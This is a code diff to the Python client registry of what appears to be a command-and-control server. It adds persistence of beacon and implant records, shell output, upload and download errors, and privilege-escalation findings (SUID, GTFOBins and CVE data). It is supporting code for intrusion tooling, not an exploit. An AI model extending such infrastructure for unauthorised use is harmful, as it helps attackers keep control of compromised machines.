@@ -66,6 +66,7 @@ class ClientRecord:
         self.sys_os = ""
         self.sys_platform = ""
         self.dl_error = ""      # R11:最近一次下载失败原因(回传给操作者看)
+        self.ul_error = ""      # 最近一次上传失败原因(串行续传中断等)
 
     def __repr__(self) -> str:
         kind = "Client" if self.is_client else "Beacon"
@@ -76,10 +77,22 @@ class ClientRecord:
 class ClientManager:
     """线程安全的客户端注册表。"""
 
-    def __init__(self, max_results_per_beacon: int = 200):
+    def __init__(self, max_results_per_beacon: int = 200, on_change=None):
         self._max_results = max_results_per_beacon
         self._clients: dict[str, ClientRecord] = {}
         self._lock = threading.Lock()
+        # 落盘回调(2026-09-28): 记录变更 → 置脏, StatePersister 合并写盘。
+        # None(默认)时静默跳过 —— 没接落盘的脚本/测试照旧可用。
+        self._on_change = on_change
+
+    def _touch(self) -> None:
+        cb = self._on_change
+        if cb is None:
+            return
+        try:
+            cb()
+        except Exception:
+            pass
 
     def register(self, client_id: str, is_client: bool = False) -> tuple[str, bool]:
         """注册新客户端或更新已有客户端。
@@ -91,11 +104,12 @@ class ClientManager:
             existing = self._clients.get(client_id)
             if existing:
                 existing.last_seen = datetime.now()
-                return client_id, False
-            record = ClientRecord(client_id=client_id, is_client=is_client,
-                                  max_results=self._max_results)
-            self._clients[client_id] = record
-            return client_id, True
+            else:
+                self._clients[client_id] = ClientRecord(
+                    client_id=client_id, is_client=is_client,
+                    max_results=self._max_results)
+        self._touch()
+        return client_id, existing is None
 
     def get_client(self, client_id: str) -> Optional[ClientRecord]:
         """获取客户端记录。"""
@@ -113,6 +127,9 @@ class ClientManager:
             rec = self._clients.get(client_id)
             if rec:
                 rec.last_seen = datetime.now()
+            else:
+                return
+        self._touch()
 
     def add_result(self, client_id: str, result: TaskResult,
                    overwrite: bool = False) -> bool:
@@ -134,14 +151,36 @@ class ClientManager:
                     if not overwrite:
                         return False  # 重复上报,跳过
                     rec.results[i] = result  # 覆盖
-                    return True
-            rec.results.append(result)
-            return True
+                    added = True
+                    break
+            else:
+                rec.results.append(result)
+                added = True
+        if added:
+            self._touch()
+        return added
+
+    def result_output(self, client_id: str, task_id: str):
+        """返回某 task_id 已存结果的 (output, error);不存在返回 None。
+
+        overwrite(交互式 shell)场景用于判断累积输出是否变化,内容未变时
+        不必重复落库/发事件(2026-09-28)。
+        """
+        with self._lock:
+            rec = self._clients.get(client_id)
+            if not rec:
+                return None
+            for r in rec.results:
+                if r.task_id == task_id:
+                    return (r.output, r.error)
+        return None
 
     def remove_client(self, client_id: str) -> None:
         """移除客户端记录。"""
         with self._lock:
-            self._clients.pop(client_id, None)
+            if self._clients.pop(client_id, None) is None:
+                return
+        self._touch()
 
     def remove_if_offline(self, client_id: str,
                           expire_seconds: int = 300) -> bool:
@@ -160,7 +199,8 @@ class ClientManager:
             if rec.active > 0 or rec.last_seen >= cutoff:
                 return False  # 活跃会话中或刚回连: 不清理
             del self._clients[client_id]
-            return True
+        self._touch()
+        return True
 
     def set_sysinfo(self, client_id: str, user: str, os_str: str) -> None:
         """缓存 sysinfo 结果，自动判定平台。"""
@@ -176,13 +216,18 @@ class ClientManager:
                     rec.sys_platform = "linux"
                 elif "darwin" in os_lower or "macos" in os_lower or "mac os" in os_lower:
                     rec.sys_platform = "macos"
+            else:
+                return
+        self._touch()
 
     def set_platform(self, client_id: str, platform: str) -> None:
         """手动设置平台 (linux / windows / macos)。"""
         with self._lock:
             rec = self._clients.get(client_id)
-            if rec and platform in ("linux", "windows", "macos"):
-                rec.sys_platform = platform
+            if not (rec and platform in ("linux", "windows", "macos")):
+                return
+            rec.sys_platform = platform
+        self._touch()
 
     # Q7 结果处理器回填白名单(sysinfo_parse 等 server 模块返回的字段)。
     # 2026-09-04 B12: 扩充 priv_esc_parse 回填字段(此前不在白名单, 提权
@@ -192,20 +237,25 @@ class ClientManager:
                         "kernel_version", "sys_distro",
                         # R11:download 失败原因此前不在白名单 → 结果处理器算出来了
                         # 却被这里丢掉,操作者只看到「任务已下发」
-                        "dl_error")
+                        "dl_error", "ul_error")
 
     def update_metadata(self, client_id: str, fields: dict) -> None:
         """按白名单回填元数据字段（Q7 结果处理器）。未知键丢弃。"""
+        changed = False
         with self._lock:
             rec = self._clients.get(client_id)
             if not rec:
                 return
             for k, v in fields.items():
                 # 支持 str/int/list(priv_esc 回填含计数 int 与 CVE 摘要 str)
-                clearable = (k == "dl_error")   # 失败原因允许被空串清掉(R11)
+                clearable = (k in ("dl_error", "ul_error"))  # 失败原因允许被空串清掉
                 if k in self._METADATA_FIELDS and (v not in (None, "") or clearable):
                     if isinstance(v, (str, int, list, dict)):
                         setattr(rec, k, v)
+                        changed = True
+            if not changed:
+                return
+        self._touch()
 
     def get_offline_clients(self, timeout: int = 300) -> list[ClientRecord]:
         """获取超时未回连的客户端列表。"""
@@ -216,3 +266,71 @@ class ClientManager:
     def set_max_results(self, n: int) -> None:
         """更新每 beacon 结果保留条数（reload 命令热重载配置用）。"""
         self._max_results = n
+        self._touch()
+
+    # ── 加密落盘(2026-09-28) ──
+    # 落盘字段: 瞬态字段不存 —— active(活跃会话计数)恢复后必须归零,
+    # running_tasks(植入物每次注册都会重报)存了反而会显示"其实早已结束"的假在跑任务。
+    _PERSIST_FIELDS = ("is_client", "via", "is_fork", "is_shell", "auto_pending",
+                       "tags", "sys_user", "sys_os", "sys_platform", "dl_error",
+                       "ul_error",
+                       "priv_suid_n", "priv_suid_gtfobins_n", "priv_cve_list",
+                       "kernel_version", "sys_distro")
+
+    def snapshot(self) -> dict:
+        """全量快照(加密落盘用; 锁内取, 返回 JSON 友好的纯数据)。"""
+        out: dict = {}
+        with self._lock:
+            for cid, rec in self._clients.items():
+                item: dict = {}
+                for k in self._PERSIST_FIELDS:
+                    val = getattr(rec, k, None)
+                    if isinstance(val, (str, int, float, list, dict)) or val is None:
+                        item[k] = val
+                item["first_seen"] = rec.first_seen.isoformat()
+                item["last_seen"] = rec.last_seen.isoformat()
+                item["results"] = [{"task_id": r.task_id, "output": r.output,
+                                    "error": r.error,
+                                    "received_at": r.received_at.isoformat()}
+                                   for r in list(rec.results)]
+                out[cid] = item
+        return out
+
+    def apply_snapshot(self, data: dict) -> int:
+        """重启恢复: 把快照灌回注册表(只补不覆盖, 不冲掉已在线会话)。返回恢复条数。"""
+        n = 0
+        if not isinstance(data, dict):
+            return 0
+        with self._lock:
+            for cid, item in data.items():
+                if not isinstance(cid, str) or not isinstance(item, dict):
+                    continue
+                if cid in self._clients:      # 已存在(如重启后该 beacon 已先注册) → 不覆盖
+                    continue
+                rec = ClientRecord(client_id=cid,
+                                   is_client=bool(item.get("is_client")),
+                                   max_results=self._max_results)
+                for k in self._PERSIST_FIELDS:
+                    if k == "is_client" or k not in item or item[k] is None:
+                        continue
+                    if isinstance(item[k], (str, int, float, list, dict)):
+                        setattr(rec, k, item[k])
+                for key in ("first_seen", "last_seen"):
+                    try:
+                        setattr(rec, key, datetime.fromisoformat(str(item.get(key))))
+                    except (TypeError, ValueError):
+                        pass
+                for r in (item.get("results") or []):
+                    if not isinstance(r, dict) or not r.get("task_id"):
+                        continue
+                    try:
+                        ts = datetime.fromisoformat(str(r.get("received_at")))
+                    except (TypeError, ValueError):
+                        ts = datetime.now()
+                    rec.results.append(TaskResult(task_id=str(r["task_id"]),
+                                                  output=str(r.get("output") or ""),
+                                                  error=str(r.get("error") or ""),
+                                                  received_at=ts))
+                self._clients[cid] = rec
+                n += 1
+        return n
